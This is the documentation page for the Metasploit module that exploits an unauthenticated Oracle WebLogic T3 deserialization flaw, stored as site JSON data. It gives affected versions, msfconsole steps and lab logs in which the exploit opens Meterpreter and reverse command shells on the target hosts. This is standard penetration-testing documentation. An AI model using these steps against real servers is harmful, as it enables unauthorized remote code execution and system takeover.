{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/misc/weblogic_deserialize","result":{"data":{"moduleMetadataJson":{"id":"bb76d090-575e-524f-aec3-68a25087b926","name":"Oracle Weblogic Server Deserialization RCE","fullname":"exploit/multi/misc/weblogic_deserialize","description":"An unauthenticated attacker with network access to the Oracle Weblogic\n        Server T3 interface can send a serialized object to the interface to\n        execute code on vulnerable hosts.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/multi/misc/weblogic_deserialize","documentationSlug":"/modules/documentation/exploit/multi/misc/weblogic_deserialize"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>Oracle Weblogic Server v10.3.6.0, v12.1.3.0, v12.2.1.2, and v12.2.1.3 are vulnerable to a deserialization vulnerable, which can be used to execute code on vulnerable systems. An unauthenticated user with network access via T3 could exploit the vulnerability. This module has been tested against Oracle Weblogic Server v10.3.6.0 running on Windows10 x64 using JDK v7u17.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><a href=\"http://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_generic.jar\">Oracle Weblogic Server v10.3.6.0</a>, v12.1.3.0, v12.2.1.2, and v12.2.1.3.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li><code class=\"language-text\">./msfconsole -q</code></li>\n<li><code class=\"language-text\">use exploit/multi/misc/weblogic_deserialize</code></li>\n<li><code class=\"language-text\">set rhosts &lt;rhost&gt;</code></li>\n<li><code class=\"language-text\">set srvhost &lt;srvhos&gt;t</code></li>\n<li><code class=\"language-text\">set srvport &lt;srvport&gt;</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"tested-on-windows-10-x64-running-oracle-weblogic-server-10360-on-jdk-v7u17\" style=\"position:relative;\"><a href=\"#tested-on-windows-10-x64-running-oracle-weblogic-server-10360-on-jdk-v7u17\" aria-label=\"tested on windows 10 x64 running oracle weblogic server 10360 on jdk v7u17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested on Windows 10 x64 running Oracle Weblogic Server 10.3.6.0 on JDK v7u17</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/misc/weblogic_deserialize) &gt; set rhosts 172.22.222.175\nrhosts =&gt; 172.22.222.175\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt; set srvhost 172.22.222.121\nsrvhost =&gt; 172.22.222.121\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt; set srvport 8888\nsrvport =&gt; 8888\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt; set target 1\ntarget =&gt; 1\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt; run\n[*] Exploit running as background job 0.\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt;\n[*] Started reverse TCP handler on 172.22.222.121:4444\n[*] Sending stage (179779 bytes) to 172.22.222.175\n[*] Meterpreter session 1 opened (172.22.222.121:4444 -&gt; 172.22.222.175:49908) at 2018-08-08 17:53:07 -0500\nsessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; sysinfo\nComputer        : _\nOS              : Windows 10 (Build 17134).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"tested-on-ubuntu-1404-lts-x64-running-oracle-weblogic-server-10360-on-sun-sdk-160_29\" style=\"position:relative;\"><a href=\"#tested-on-ubuntu-1404-lts-x64-running-oracle-weblogic-server-10360-on-sun-sdk-160_29\" aria-label=\"tested on ubuntu 1404 lts x64 running oracle weblogic server 10360 on sun sdk 160_29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested on Ubuntu 14.04 LTS x64 running Oracle Weblogic Server 10.3.6.0 on Sun SDK 1.6.0_29</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/misc/weblogic_deserialize\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt; set rhosts 172.22.222.205\nrhosts =&gt; 172.22.222.205\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt; set srvhost 172.22.222.207\nsrvhost =&gt; 172.22.222.207\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt; set lhost 172.22.222.207\nlhost =&gt; 172.22.222.207\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt; check\n\n[+] 172.22.222.205:7001 - Detected Oracle WebLogic Server Version: 10.3.6.0\n[*] 172.22.222.205:7001 The target appears to be vulnerable.\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt; run\n[*] Exploit running as background job 0.\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt;\n[*] Started reverse TCP handler on 172.22.222.207:4444\n[*] 172.22.222.205:7001 - Sending handshake...\n[*] 172.22.222.205:7001 - Sending client object payload...\n[*] 172.22.222.205:7001 - Comparing host: 172.22.222.205\n[*] 172.22.222.205:7001 - Sending payload to client: 172.22.222.205\n[*] 172.22.222.205:7001 - Comparing host: 172.22.222.205\n[*] Command shell session 1 opened (172.22.222.207:4444 -&gt; 172.22.222.205:37168) at 2018-08-30 06:10:31 -0500\n[*] 172.22.222.205:7001 - Server stopped.\n\nmsf5 exploit(multi/misc/weblogic_deserialize) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nuname -a\nLinux ubuntu 4.4.0-134-generic #160~14.04.1-Ubuntu SMP Fri Aug 17 11:07:07 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"bb76d090-575e-524f-aec3-68a25087b926"}}}